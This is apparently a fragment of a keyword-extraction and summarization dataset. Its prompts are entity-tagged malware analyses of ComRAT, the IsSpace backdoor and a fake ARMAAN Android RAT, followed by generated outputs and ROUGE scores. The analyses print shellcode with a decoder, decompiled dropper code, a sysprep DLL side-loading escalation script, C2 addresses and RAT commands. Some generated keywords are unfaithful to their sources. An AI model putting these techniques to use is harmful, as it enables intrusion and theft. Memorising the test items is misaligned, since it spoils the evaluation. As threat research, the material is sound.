[CARDINAL] 2.14.1 were retained . Moreover , the developers changed the compiler ; they switched from [PERSON] Visual [PERSON] Studio [CARDINAL] 6.0 to [PERSON] Visual [PERSON] Studio [PERSON] 9.0/10.0 , which is a strong indicator for the huge differences . Version [CARDINAL] 3.00 is what the G DATA SecurityLabs experts call ComRAT . We can say that version [CARDINAL] 2.14.1 is the last version of Agent . BTZ . Here are the main differences between Agent . BTZ and ComRAT : The new malware collects more information about the infected system ( such as drive information , volume information \u2026 ) . The media stick infection mechanism has definitely been removed . We assume this happened due to the fact that [ORG] Microsoft has disabled [ORG] AutoRun for external media . For the attackers , this infection vector is not interesting anymore . The malware is injected into every process of the infected machine and the main payload is executed in \u201c explorer.exe \u201d as we explained in our article ; The communication channel to the command and control is not the same anymore . In this new version , the malware uses [ORG] POST requests with the following pattern : As the malware is injected into every process of the infected system , it creates named pipe in order to handle inter - processes communication . On [CARDINAL] several [CARDINAL] 3.00 samples , the author forgot to remove the compilation path , here are some examples : c:\\projects\\ChinckSkx64\\Debug\\Chinch.pdb c:\\projects\\ChinckSkx64\\Release\\libadcodec.pdb C:\\projects\\ChinckSkx64\\x64\\Release\\libadcodec.pdb E:\\old_comp\\_Chinch\\Chinch\\trunk\\Debug\\Chinch.pdb c:\\projects\\ChinchSk\\Release\\libadcodec.pdbThanks to these compilation paths , we assume that the original name of the [ORG] RAT is \u201c Chinch \u201d , which leads us to the assumption that the \u201c CH \u201d characters in the version name and in the flag \u201c < CHCMD > \u201d stands for \u201c Chinch \u201d . In [LANGUAGE] English , [GPE] chinch is the word for a small [NORP] North [NORP] American bug , [ORG] Blissus leucopterus . This word is Code similarity : [CARDINAL] 90%The codes are similar to each other , but the authors added several features : The malware generates more logs ; The malware has a [ORG] Mutex handle ; The [CARDINAL] 3.10 version supports multiple command and control servers . The last new feature is really interesting : if the compromised targets block a specific command and control Code similarity : [CARDINAL] 93%The major new feature in the version is the new exports function called InstallW ( ) . This exported function is used by the dropper to add persistence in the registry and to drop a [ORDINAL] second file ( as explained in our previous article ) . Version [CARDINAL] 3.20 uses the following CLSID in order to hijack [ORG] COM object : B196B286 - BAB4- 101A - B69C-00AA00341D07 . This object is the [ORG] IConnectionPoint interface . The [PERSON] CLSID was only used in this version . We assume that the performed [ORG] COM object hijacking generates some trouble on the infectedsystem , that \u2019s why the author changed related things in the next version . Furthermore , the [PERSON] CLSID was Code similarity : 91%In the [CARDINAL] 3.25 version , the author switched to the CLSID : [CARDINAL] 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1 as described in our article . Furthermore , the strings in the sample are obfuscated . The main new feature is the obfuscation \u2013 almost all strings are obfuscated and the XML pattern is not written in plain text anymore . Differences between version Ch [CARDINAL] 3.25 ( [DATE] 2014 - 02 ) and Ch [CARDINAL] 3.26 ( [DATE] 2013 - 01 ; date has Code similarity : [CARDINAL] 95%The version [CARDINAL] 3.26 is the latest known version . In this version : The authors removed the familiar XOR key used by Agent . BTZ and [GPE] Uroburos . We assume that due to the G DATA publication in [DATE] February [DATE] 2014 , the author decided to remove as many links as possible between [GPE] Uroburos and Agent . BTZ / ComRAT / Chinch ; The authors do not generate logs anymore ; The compilation date has been modified , in order to make the analysis and timeline creation more complex . ConclusionThis analysis shows us [DATE] seven [DATE] years of the evolution of a Remote Administration Tool , used by a group which targeted extremely sensitive entities , such as the [GPE] US [ORG] Pentagon in [DATE] 2008 or [ORG] the [ORG] Belgium [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs in [DATE] 2014 as well as [ORG] the [ORG] Finnish [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs . Except for version [CARDINAL] 3.00 , the modifications made are rather marginal . We can see that the authors adaptedfeatures to the [PRODUCT] Windows versions , patched bugs , added obfuscation etc \u2026 The biggest update was performed to version [CARDINAL] 3.00 , after [DATE] two [DATE] years of silence . Visibly , this [ORG] RAT was used alongside the [ORG] Uroburos rootkit . Nevertheless , it is not entirely clear how and when the attackers choose to use the [ORG] RAT or the rootkit or whether both are used in parallel . Taking everything into consideration , [ORG] G [ORG] DATA [ORG] SecurityLabs experts are sure that the group behind [GPE] Uroburos / Agent . BTZ / ComRAT / Linux tool/ \u2026 will remain an active player in the malware and [ORG] APT field . The newest revelations made and connections drawn let us believe that there is even more to come .", "generated_text": "the history; the development; Agent. BTZ; ComRAT; evolution; seven years; development; Uroburos; the malware; port; Command; commands; commands; a command line; a registry; server; a command line; the Injector; a command; a library; names; the rootkit; the executable; the user; rootkit; the system; the user; logs; commands; the victim; rss; a command; command execution; the RAT; the evolution.", "ref_text": "<START-1>The document analyzes the evolution of the sophisticated ComRAT malware, which is the successor to the Agent.BTZ remote access trojan (RAT). Both are linked to the Uroburos rootkit and used by the same threat actor in targeted campaigns. The analysis covers 7 years of development across 10 major versions of the RAT, from Agent.BTZ v1.0 in 2007 to ComRAT v3.26 in 2014. Version info shows incremental changes over time with the biggest update in v3.00 transitioning it from Agent.BTZ to ComRAT. Early versions of Agent.BTZ rely on AutoRun for infection and use a simple XOR cipher and ASCII config. Later versions add obfuscation, support for Windows Vista, bug fixes, and COM object hijacking.  ComRAT in v3.00 switches compilers, name, comms, injects all processes, and leverages pipes for IPC. It exfiltrates more system info and abandons AutoRun. Later versions add logging, multiple C2s, new registry persistence, and further string obfuscation. The RAT evolved to support new Windows versions, evade detection, fix bugs, and enhance capabilities over time. The timeline matches reported attacks on high-value targets like government bodies. The threat actor behind it continues to actively develop multiple malware strains to compromise targets. Their tools show an interest in persisting on systems long-term while exfiltrating sensitive data. The analysis provides valuable historical insight into the adversary's malware development lifecycle over many years.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3988603988603988, "gpt3/lexical/rouge_rouge2": 0.11461318051575929, "gpt3/lexical/rouge_rougeL": 0.18803418803418803, "gpt3/lexical/rouge_rougeLsum": 0.18803418803418803, "gpt3_generated_text": ["The article discusses the evolution of sophisticated spyware, specifically focusing on the Agent. BTZ and ComRAT malware strains. The experts analyzed the development of these remote administration tools over a span of seven years. They discovered that the malware was linked to the Uroburos rootkit and suggested that the actor behind these campaigns used various malware strains to compromise targeted infrastructure. The article provides a table with minimal information about the different versions of the malware, indicating their compilation dates. It is noted that the malware was most active in 2007 and 2008, with new versions declining in frequency in subsequent years. Overall, the article emphasizes the ongoing development and sophistication of spyware such as Agent. BTZ and ComRAT."]}, {"split_name": "val", "sample_id": "val_60", "prompt_text": "Extract the keywords: Watering Hole Attack on [ORG] Aerospace [ORG] Firm [ORG] Exploits CVE-2015 - 5122 to [ORG] Install [ORG] IsSpace [ORG] BackdoorOn [DATE] July 16 , [DATE] 2015 , the [ORG] Palo [ORG] Alto [ORG] Networks Unit [CARDINAL] 42 threat intelligence team discovered a watering hole attack on the website of a well - known aerospace firm . The website was compromised to launch an apparent watering - hole attack against the company \u2019s customers . It was hosting an [PERSON] Adobe [PERSON] Flash exploit targeting [CARDINAL] one of the newly disclosed vulnerabilities from [ORG] the [ORG] Hacking [ORG] Team data breach , CVE-2015 - 5122.This attack yet again showcases the opportunistic tendencies of adversary groups and bad actors . The malware deployed by this exploit has been seen in a number of targeted attacks and provides attackers with a foothold on the victim \u2019s machine and/or network . The exploit file , movie.swf , was [ORG] ZWS compressed , a tactic that has been observed to evade anti - virus programs . Once uncompressed , a binary was found to be embedded in the [PERSON] Flash file . Upon further analysis , this file was found to contain behavior consistent with a [GPE] Trojan commonly called [ORG] IsSpace . Based on its codebase and behavioral patterns , it appears that [PERSON] IsSpace could possibly be an evolution of the [PRODUCT] NFlog backdoor , which has previously been attributed to the adversary groups DragonOK and [PERSON] Moafee . Both groups are thought to be operating out of [LOC] Southeast [LOC] Asia , and [PERSON] Moafee in particular has been associated with attacks on the [GPE] US defense industrial base . [GPE] Exploit [PERSON] DetailsThe CVE-2015 - 5122 exploit found within the [PERSON] Flash file is nearly identical to the original proof of concept ( [ORG] POC ) disclosed publically from [ORG] the [ORG] Hacking [ORG] Team data breach . An analysis by [ORG] Trend [ORG] Micro covers the [ORG] POC in detail . Unlike the [ORG] POC mentioned in the [ORG] Trend [ORG] Micro report , this particular exploit file was weaponized , and , instead of loading calc.exe , a much more malicious file was loaded . As seen in Figure [CARDINAL] 1 , the embedded shellcode is obfuscated using the same technique of representing bytes as integers and exponential numbers . However it appears that the adversary did not modify the [ORG] POC much , as the variable name \u2018 calc \u2019 remains unchanged . Figure [CARDINAL] 1 . Embedded shellcode within the malicious Flash fileThese values can be converted into their byte representations using a simple Python script , truncated here for brevity . > > > import struct > > > shellcode = [ [CARDINAL] 2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585 ] > > > for s in shellcode : print repr(struct.pack(\"I \" , s ) ) ' [ORG] U\\x8b\\xec\\x81 ' ' \\xec`\\x04\\x00 ' ' \\x00S\\x90\\x90 ' ' \\x90\\x90\\xc7\\x85 ' ' \\xd0\\xfc\\xff\\xff ' ' AAAA ' > > > import struct > > > shellcode = [ [CARDINAL] 2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585 ] > > > for s in shellcode : print repr(struct.pack(\"I \" , s ) ) ' U\\x8b\\xec\\x81''\\xec`\\x04\\x00''\\x00S\\x90\\x90''\\x90\\x90\\xc7\\x85''\\xd0\\xfc\\xff\\xff''AAAA'Looking at the shellcode in further detail shows a fairly simplistic instruction set . Functions are loaded dynamically , and a file is dropped to % TEMP%\\Rdws.exe before being executed using the WinExec Windows API call.sz_file_path = [ORG] GetTempPathA(256 , file_path ) ; * & file_path[sz_file_path ] = ' swdR ' ; * & v6[v7 + 4 ] = ' exe . ' ; * & v6[v7 + 8 ] = [CARDINAL] 0 ; file_handle = CreateFileA(file_path , [GPE] 0x40000000 , [DATE] 0 , [DATE] 0 , [CARDINAL] 2 , [DATE] 0 , 0 ) ; if ( file_handle ! = -1 ) { WriteFile(file_handle , data , v41 , & v110 , [CARDINAL] 0 ) ; CloseHandle(file_handle ) ; WinExec(file_path , 0 ) ; } sz_file_path = [ORG] GetTempPathA(256 , file_path);v6 = file_path;v7 = sz_file_path;*&file_path[sz_file_path ] = ' swdR';*&v6[v7 + 4 ] = ' exe . ';*&v6[v7 + 8 ] = 0;file_handle = CreateFileA(file_path , [GPE] 0x40000000 , [DATE] 0 , [DATE] 0 , [CARDINAL] 2 , [DATE] 0 , [CARDINAL] 0);if ( file_handle ! = -1 ) { WriteFile(file_handle , data , v41 , & v110 , 0);CloseHandle(file_handle);WinExec(file_path , 0);}Returning to the Flash exploit , we discover that the dropped file is embedded within the [PERSON] Flash file itself as [ORG] ByteArray . This binary data is loaded and decompressed with [ORG] ZLIB prior to being stored in a newly allocated section of memory . The address of this binary data is then stored in the shellcode before it is executed . Figure [CARDINAL] 2 . Exploit loading binary and running shellcodeAfter successful execution , a binary with the following attributes is executed on the victim \u2019s machine . MD5 [PRODUCT] Compile [PRODUCT] TimestampMalware [PRODUCT] Details319500B2C792AEE6CD8EF8EE87D9DC1E [PRODUCT] PE32 executable ( [ORG] GUI ) [PERSON] Intel [PERSON] 80386 , for MS Windows 2014 - 11 - 14 04:35:13 UTCAs seen by the compile timestamp , this malware sample is not extremely current . The timestamp shows a compile date of [DATE] November 14 , [DATE] 2014 , which indicates that the infrastructure used by this particular sample has remained intact for quite some time , relatively speaking . Analysis of the malware indicates that this sample is highly likely to be the [GPE] Trojan tool [ORG] IsSpace , which shares similar code and behaviors as the [GPE] NFlog tool . When comparing [PERSON] IsSpace to [GPE] NFlog , we noticed a number of changes have been made . When initially run , the malware attempts to write log messages to \u2018 C:\\ProgramData\\log[.]txt \u2019 indicating that this variant was intended to run on [ORG] Microsoft Windows 7 or higher . However , it still maintains the capability to run on operating systems earlier than [ORG] Microsoft Windows 7 if needed . IsSpace creates an event named\u2018MdQ0784kd \u2019 to ensure that only a single instance of the malware is running at any given time on an infected host . To determine the flow of execution , [PERSON] IsSpace gathers various data about the infected host , such as administrative rights of the user , operating system version , and CPU architecture . If [PERSON] IsSpace determines that it is running as an administrator on a [ORG] Microsoft Windows [CARDINAL] 7 system on a 32 - bit platform , it will attempt to execute itself accordingly , using a side - loading technique . The malware will drop a cabinet file and batch script to the following locations:%TEMP%\\FASAP.DAT % TEMP%\\FASAPI.batThe batch script contains the following:@echo off ping localhost start wusa [ % TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ start % windir%\\system32\\sysprep\\sysprep.exe \" [ CWD]\\[Malware].EXE\"@echo offping localhoststart wusa [ % TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ping localhostping localhostping localhostping localhostping localhoststart % windir%\\system32\\sysprep\\sysprep.exe \" [ CWD]\\[Malware].EXE\"[CWD ] is the directory where the malware was run from and [ % TEMP% ] is the full path of the % TEMP% directory . The batch script will [ORDINAL] first extract the cabinet file to the sysprep directory . The extracted file is a 32 - bit [ORG] DLL with the name \u2018 CryptBase.dll . \u2019 The batch script continues to execute sysprep.exe after [TIME] approximately [TIME] 5 [TIME] seconds , which will automatically load the dropped CryptBase.dll file . This [ORG] DLL will execute the provided argument in a child process . This newly created process has elevated privileges as it is spawned bysysprep.exe . A similar process is taken for [CARDINAL] 64 - bit systems . However , instead of dropping a batch script , a [CARDINAL] 64 - bit executable along with a cabinet file containing a [CARDINAL] 64 - bit version of [ORG] CryptBase.dll is dropped to the following path instead:%TEMP%\\FASAPI.bin % TEMP%\\FASAP.DATThis executable is then run in a new process . It is responsible for unpacking the cabinet file and spawning a new instance of sysprep.exe . If the malware detects that it is running on a Windows XP host , it will attempt to check for Internet connectivity by making a HTTP request to www.microsoft.com . This is similar to characteristics observed in the [GPE] NFlog backdoor , with the primary deviation being that this activity only takes place when running and control ( C2 ) server . The initial HTTP request is made to \u2018 //STTip.asp . \u2019 Note the extra leading forward slash . This is likely an unfortunate side effect of the malware expecting a subdirectory in the [ORG] URI path . As this particular sample did not supply one , the extra slash is seen . An example request made can be seen below : Figure [CARDINAL] 3 . Initial IsSpace beacon being sentAfter the initial beacon , [PERSON] IsSpace will exfiltrate victim information by making an HTTP request to \u2018 //SNews.asp?HostID = xx - xx - xx - xx - xx - xx \u2019 , where the [GPE] HostID contains the victim \u2019s [ORG] MAC address . The [ORG] POST data sent in this request is encrypted using the same four - byte XOR key of \u2018 \\x35\\x8E\\x9D\\x7A \u2019 that LJLV2NKIOKP#%#Win7#%#English(US)#%#2015 - 07 - 17 07 - 17 09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'Once again , the exfiltrated data is very similar to what has been used by [ORG] NFlog ; however with [PERSON] IsSpace , the victim \u2019s user privilege level is also included , in addition to a variable of either \u2018 IsSpace \u2019 or \u2018 IsGoogle . \u2019 This particular variable is still under investigation by Unit 42 . Additionally , we see what is likely a campaign code of \u2018 303_20140401\u2019 . After the successful check - in and initial exfiltration , [PERSON] IsSpace will then accept the following commands : Command List specified directory [ORG] Delete fileResponse URI N / AIsSpace provides attackers with a foothold into the victim \u2019s machine and/or network . While the malware itself provides limited functionality , it allows attackers to perform minimal reconnaissance and deploy Pivoting off of this primary C2 IP address using passive [ORG] DNS data , we located [CARDINAL] seven domain names and [CARDINAL] two additional [ORG] IP addresses that may be related to this attack . [CARDINAL] Three of the domains found used the prefix \u2018 ssl \u2019 or \u2018 dns \u2019 as the [ORDINAL] third level domain ; this tactic is commonly used by malware authors as an evasion method . Examining the [ORG] WHOIS data for the domains revealed additional intelligence on possible attribution . Specifically , the [ORG] WHOIS data showed the start - vedioing[.]net to be allegedly registered to an entity in [GPE] Japan : Registry Registrant ID : Registrant Name : Alta Rohde Registrant Organization : Registrant Street : tokoy [FAC] Registrant [FAC] Street : tokoy [GPE] Registrant [GPE] City : tokoy [ORG] Registrant State / Province : [ORG] Aomori [ORG] Registrant [ORG] Postal Code : 236521 Registrant Country : Japan Registrant Phone : +81.21244215 Registrant Phone Ext : Registrant Fax : Registrant Fax Ext : Registrant Email : alta.rohde@inbox[.]comAnd the anywhere - staring[.]com was found to be allegedly registered to an entity in [GPE] China : Registry Registrant ID : Registrant Name : lan fei [ORG] Registrant Organization : [ORG] Registrant [ORG] Street : tian jing lu [CARDINAL] 244 Registrant City : bei da [ORG] Registrant State / Province : qing nao [ORG] Registrant [ORG] Postal [ORG] Code : 888000 Registrant Country : China Registrant Phone : +86.13877554411 [WORK_OF_ART] Registrant [WORK_OF_ART] Phone Ext : [WORK_OF_ART] Registrant [WORK_OF_ART] Fax : [WORK_OF_ART] Registrant [WORK_OF_ART] Fax Ext : [WORK_OF_ART] Registrant Email : csolyc110@163[.]comThe geographic regions indicated in the [ORG] WHOIS data are consistent with campaigns previously associated with [PRODUCT] NFlog , showing that the adversaries attributed to this malware were highly likely to be operating out of [LOC] Southeast [LOC] Asia . [PERSON] IsSpace is a newer variant of the [GPE] NFlog malware family , and contains many similarities in its behavior and code base . It is highly likely that adversary groups that have historically used [PRODUCT] NFlog are now using [ORG] IsSpace . [ORG] ConclusionAdversaries continue to exploit easily accessible vulnerabilities and readily re - use exploit code and payloads , largely due to their efficacy . This type of behavior and activity is expected to continue for the near future due to the multiple vulnerabilities disclosed by [ORG] the [ORG] Hacking [ORG] Team data breach . As with many other previously disclosed advanced attacks , relying purely on a detection - based model for security is ineffective when IOCs are either unknown or are not readily available for ingestion . Thus , it is imperative that organizations deploy automated , behavior - based preventative measures such as [ORG] Palo [ORG] Alto [ORG] Networks [ORG] WildFire or [ORG] Traps to reduce the risk of unknown attacks . [ORG] Palo [ORG] Alto [ORG] Networks customers using [ORG] WildFire are protected from this campaign . Additionally , [ORG] IPS signature [DATE] 14365 detects [PERSON] IsSpace command and control traffic inside a network . [PERSON] File [PERSON] InformationName [PERSON] Compile TimestampRdws.exe [PRODUCT] PE32 executable ( [ORG] GUI ) [PERSON] Intel [PERSON] 80386 , for MS Windows 2014 - 11 - 14 [TIME] 04:35:13 UTCC2 IP Address PE32 + executable ( console ) x86 - 64 , for MS Windows 2014 - 05 - 06 13:23:38 [ORG] UTC [ORG] FASAP.DAT ( [CARDINAL] 64 - bit ) [ORG] Microsoft [ORG] Cabinet archive data , [CARDINAL] 4065 bytes , [CARDINAL] 1 file CryptBase.dll ( [CARDINAL] 64 - bit ) PE32 + executable ( [ORG] DLL ) ( [ORG] GUI ) x86 - 64 , for MS Windows 2014 - 04 - 21 13:08:07 [CARDINAL] UTCFASAP.DAT [ORG] Microsoft [ORG] Cabinet archive data , [CARDINAL] 3870 bytes , [CARDINAL] 1 file CryptBase.dll ( [CARDINAL] 64 - bit ) PE32 executable ( [ORG] DLL ) ( [ORG] GUI ) [PERSON] Intel [PERSON] 80386 , for MS Windows 2014 - 04 - 20 [TIME] 12:19:57 [ORG] UTC", "generated_text": "the website; the CVE-2015-5122 vulnerability; the Flash; the exploit; IsSpace; attacks; the Flash file; code; a binary; the malware; POC; a variant; the NFlog backdoor; DragonOK; Moafee; Southeast Asia; the attackers; a foothold; the victim; network; a hacked version; the backdoor; a keylogger; the victim; the malware; the system; systems; control; the embedded shellcode; opportunistic tendencies; adversary groups; bad actors; this attack; a foothold; the victim; the airline industry.", "ref_text": "<START-1>The document describes a watering hole attack discovered by Palo Alto Networks in July 2015 targeting the website of an aerospace company. The attack exploited the recently disclosed Adobe Flash vulnerability CVE-2015-5122 from the Hacking Team data breach. The exploit delivered a malware payload called IsSpace, which appears to be an evolution of the NFlog backdoor associated with threat groups in Southeast Asia like DragonOK and Moafee. IsSpace shares code similarities with NFlog but contains some updates like additional logging and commands. The Flash exploit is nearly identical to the public proof-of-concept for CVE-2015-5122. It drops a binary called Rdws.exe in the temp folder which executes IsSpace. IsSpace gathers system info and beacons to a C2 server at 172.246.109.27. It can exfiltrate data and accept commands like file upload/download, command execution, etc. IsSpace uses a technique called side-loading to gain persistence on the infected system. On 32-bit Windows it drops a DLL and batch script to extract and load the DLL using a signed executable sysprep.exe. This gives the malware elevated privileges. The infrastructure links and WHOIS registration details for the C2 domain suggest the attack originates from threat actors in Southeast Asia, consistent with attribution for the NFlog malware. The attack demonstrates how adversaries quickly leverage new vulnerabilities and reuse effective malware code. The document highlights the need for behavior-based security controls rather than relying solely on signature-based defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.39766081871345027, "gpt3/lexical/rouge_rouge2": 0.19411764705882353, "gpt3/lexical/rouge_rougeL": 0.28654970760233917, "gpt3/lexical/rouge_rougeLsum": 0.28654970760233917, "gpt3_generated_text": ["The article discusses a watering hole attack that targeted the website of an aerospace firm. The attack exploited the CVE-2015-5122 vulnerability in Adobe Flash and installed a backdoor called IsSpace on the victim's machine. The IsSpace backdoor is believed to be an evolution of the NFlog backdoor, which has been associated with adversary groups DragonOK and Moafee operating in Southeast Asia. The article provides details of the exploit and the embedded shellcode used. This attack highlights the opportunistic nature of adversary groups and the need for increased cybersecurity measures in the airline industry."]}, {"split_name": "val", "sample_id": "val_61", "prompt_text": "Extract the keywords: [ORG] Indian [ORG] Army [ORG] Personnel [ORG] Face [ORG] Remote [ORG] Access [ORG] Trojan Attacksblog.cyble.com/2022/01/28/indian-army-personnel-face-remote-access-trojan-attacks/January [CARDINAL] 28 , 2022Cyble [PERSON] Research [PERSON] Labs has come across a [PRODUCT] Twitter post wherein security researchers have brought to focus an [ORG] Android malware that pretends to be the legitimate [ORG] ARMAAN application . [ORG] The [ORG] Army Mobile Aadhaar App Network ( [ORG] ARMAAN ) is an umbrella application covering various facets of information & services concerning all ranks of [ORG] the [ORG] Indian [ORG] Army , and the app is used only by [ORG] Indian [ORG] Army personnel . [ORG] Threat [ORG] Actors ( TAs ) have customized the legitimate [ORG] ARMAAN app and added malicious code into it . During our analysis , we observed that this malicious application uses the icon , name , and even source code of the legitimate [ORG] ARMAAN app . To create this malicious application , attackers have added an extra package in the legitimate application \u2019s source code to enable it to perform RAT activities . From our analysis , we concluded that upon successful execution , this malicious application could steal sensitive data such as contacts , call logs , [PERSON] SMSes , location , files from external storage , record audio , etc . , from the victims \u2019 devices . Technical Analysis APK Metadata [ORG] InformationApp Name : [ORG] ARMAAN [ORG] Package [ORG] Name : in.gov.armaan shown in the figure below . Figure [CARDINAL] 2 \u2013 App Icon and [ORG] Name2/10Figure [ORG] 3 [ORG] \u2013 [ORG] App [ORG] Requests [PERSON] KYC [PERSON] DocumentsWhen the user inputs the [ORG] AADHAAR number , the malware communicates with the official [ORG] ARMAAN server to verify the account , as shown below . Figure [CARDINAL] 4 \u2013 App Communicates to [ORG] Legitimate [ORG] ServerOn comparing the legitimate [ORG] ARMAAN application and the modified malicious [ORG] ARMAAN application , we identified that the TAs have added an extra package containing malicious code , as shown in the figure below.3/10Figure [CARDINAL] 5 \u2013 Added Source Code Package in Malicious AppManifest Description The malware requests the user for [CARDINAL] 22 different permissions . Out of these , it abuses [CARDINAL] ten permissions . These dangerous permissions are listed below . PermissionsREAD_SMSRECEIVE_SMSREAD_CALL_LOGREAD_CONTACTSREAD_PHONE_STATERECORD_AUDIOACCESS_COARSE_LOCATIONACCESS_FINE_LOCATIONDescriptionAccess SMSes in the device database ( DB).Intercept [PERSON] SMSes received on the victim \u2019s deviceAccess Call LogsAccess phone contacts . Allows access to phone state , including the current cellular network information , the phone number and the serial number of the phone , the status of any ongoing calls , and a list of any [ORG] Phone [ORG] Accounts registered on the device . Allows the app to record audio with the microphone , which the attackers can misuse . Allows the app to get the approximate location of the device network sources such as cell towers and Wi - Fi . Allows the app to get the device \u2019s precise location using the Global Positioning System ( GPS).ACCESS_BACKGROUND_LOCATION Allows an app to access location in the background . ACCESS_WIFI_STATEAllows the app to get information about Wi - Fi connectivity . We observed added services and receivers entries in the manifest file of the malicious app , as shown in Figure [CARDINAL] 6.4/10Figure 6 \u2013 Added Entries in [ORG] ManifestIt is also observed in the manifest that the TAs have added dangerous permissions entries such as READ_CONTACTS , READ_CALL_LOG , RECORD_AUDIO , ACCESS_COARSE_LOCATION , etc . in modified malicious [ORG] ARMAAN applications . Figure [CARDINAL] 7 \u2013 Added Permissions Entry in [DATE] Malicious [DATE] APPSource [DATE] Code [DATE] Review Our static analysis indicated that the malware steals sensitive data such as [ORG] Contacts , [PERSON] SMSes , and Call logs , besides recording audio and taking pictures from the camera , etc . , on commands from the [GPE] C&C.The malware uses a fixed hardcoded array containing [ORG] the IP \u2019s ASCII values : [CARDINAL] 173[.]212.220.230 and port : [CARDINAL] 3617 Details . The malware then converts and uses them for its [ORG] C&C communication , as shown in Figure 8.5/10Figure [CARDINAL] 8 \u2013 Malware CommunicationThe getAlluserInfo ( ) method has been used to collect the user \u2019s device information such as phone number , device manufacturer \u2019s details , etc . , from the device , as shown in Figure [DATE] 9.Figure [DATE] 9 \u2013 Collects User \u2019s InformationThrough the getAllSMS ( ) method , we identified that the malware collects SMSs data from the device , as shown in the below figure.6/10The method getAllContacts ( ) has been used to collect [ORG] Contacts data from the device , as shown below . Figure [CARDINAL] 10 \u2013 Code to Collect SMSsFigure 11 \u2013 Code to [ORG] Collect [ORG] Contacts DataMethod getAllCallLogs ( ) depicts the malware \u2019s ability to collect Call logs data from the device . [PERSON] Refer to Figure [DATE] 12.Figure [DATE] 12 [DATE] \u2013 [DATE] Code to Collect Call logsThe code snippet shown in the below image depicts the malware \u2019s ability to collect the device \u2019s location data from the device . Figure [CARDINAL] 13 \u2013 Collects Location Data from the [ORG] DeviceThe image shown below showcases the malware \u2019s code that collects and sends images from the [ORG] WhatsApp directory in the device to the server on commands from the TAs . Figure [CARDINAL] 14 \u2013 Steals Images from [ORG] WhatsApp Directory7/10The method sentMicRecording ( ) shown in the below image depicts the malware \u2019s ability to record mic and send the recorded data to the server on the TAs command . After the data is sent , the malware deletes the file . The below figure represents the malware \u2019s ability to capture images from the front and back camera and send the recorded data to the server on the TAs command . Figure [CARDINAL] 15 \u2013 Records MicFigure 16 \u2013 [ORG] Capture [ORG] Images from [ORG] Front and Back CameraThe malware collects the document files from the device through the remainingDocumentFiles ( ) method shown in the figure below . Below are the commands used by the TA to control the infected device : Figure [CARDINAL] 17 \u2013 Code to Collect Document Files8/10Command DescriptionD%r6t*Get SMS datas%7n@2Get Contacts datai*g4#3Get Call logs [CARDINAL] dataO@y7J&Start mic recording5w$I!71^R$4tj*7e@4Get document filesGet images from the [ORG] WhatsApp folderClick photos from the device cameraA website with the domain name [PERSON] hxxps://armaanapp[.]in was registered [DATE] around [DATE] a [DATE] year [DATE] ago . It seems that TAs used this website to deliver malicious versions of the [ORG] ARMAAN application , as shown in the below figure below . Figure [CARDINAL] 18 \u2013 Fake WebsiteConclusion The modified , malicious [ORG] ARMAAN app poses a serious threat to [ORG] the [ORG] Indian [ORG] Armed [ORG] Forces . It can perform RAT activities with the potential to steal [ORG] Indian [ORG] Army personnel \u2019s sensitive data , including contacts , call logs , [PERSON] SMSes , [ORG] Location , and files from external storage , in addition to the ability to record sensitive audio . TAs constantly adapt their methods to avoid detection and find new ways to target users through increasingly sophisticated techniques . Such malicious applications often masquerade as legitimate applications to trick users into installing them . This situation makes it imperative for users to install applications only after verifying their authenticity . Apps should only be installed exclusively via the official Google Play Store and other trusted portals to avoid such attacks . Our Recommendations We have listed some essential cybersecurity best practices that create the [ORDINAL] first line of control against attackers . We recommend that our readers follow the best practices given below : How to prevent malware infection?Download and install software only from official app stores like Google Play Store or [FAC] the [FAC] iOS [FAC] App [FAC] Store . Use a reputed anti - virus and internet security software package on your connected devices , such as PCs , laptops , and mobile devices . Use strong passwords and enforce multi - factor authentication wherever possible . Enable biometric security features such as fingerprint or facial recognition for unlocking the mobile device where possible . Be wary of opening any links received via SMS or emails delivered to your phone . Ensure that Google Play Protect is enabled on [ORG] Android devices . Be careful while enabling any permissions . Keep your devices , operating systems , and applications updated.9/10How to identify whether you are infected?Regularly check the [GPE] Mobile / Wi - Fi data usage of applications installed in mobile devices . Keep an eye on the alerts provided by Anti - viruses and [ORG] Android [ORG] OS and take necessary actions accordingly . What to do when you are infected?Disable Wi - Fi / Mobile data and remove [ORG] SIM card \u2013 as in some cases , the malware can re - enable [ORG] the [ORG] Mobile [ORG] Data . Perform a factory reset . Remove the application in case a factory reset is not possible . Take a backup of personal media [PERSON] Files ( excluding mobile applications ) and perform a device reset . What to do in case of any fraudulent transaction?In case of a fraudulent transaction , immediately report it to the concerned bank . What should banks do to protect their customers?Banks and other financial entities should educate customers on safeguarding themselves from malware attacks via telephone , [PERSON] SMSes , or emails . MITRE ATT&CK \u00ae [ORG] TechniquesTacticInitial [ORG] AccessInitial [ORG] AccessExecutionCollectionCollectionCollectionCollectionCollectionCollectionCollectionTechnique [ORG] ID [ORG] Technique NameT1476T1444T1575T1433T1412T1432T1429T1512T1533T1430Deliver Malicious [ORG] App via Other Mean . Masquerade as [ORG] Legitimate [ORG] ApplicationNative [ORG] CodeAccess [ORG] Call [ORG] LogCapture [ORG] SMS [ORG] MessagesAccess [ORG] Contact ListCapture AudioCapture CameraData from [ORG] Local [ORG] SystemLocation [ORG] TrackingCommand and Control T1436Commonly Used PortsIndicators of Compromise ( IOCs)IndicatorsIndicator", "generated_text": "an Android malware; Indian Army personnel; the Android malware; ARMAAN; the legitimate ARMAAN application; the app; RAT activities; the attackers; a malicious app; source code; the malware; the user; 22 different permissions; permissions; READ_CONTACTS; READ_CALL_LOG; Record audio; service; notification; status; files; memory; contact; location; files; files; the developer; the RAT; the malware; the user; the attackers; IP; the RAT; external memory; the malware; the user; the RAT; the Android; the network; detection.", "ref_text": "<START-1> The blog post analyzes a malware that pretends to be the legitimate Indian Army application called ARMAAN. This Android malware adds malicious code to the real ARMAAN app to turn it into spyware targeting Indian Army personnel. The malware uses the same icon, name, and some source code as the real app. It requests extensive permissions like reading SMS, contacts, call logs, location, 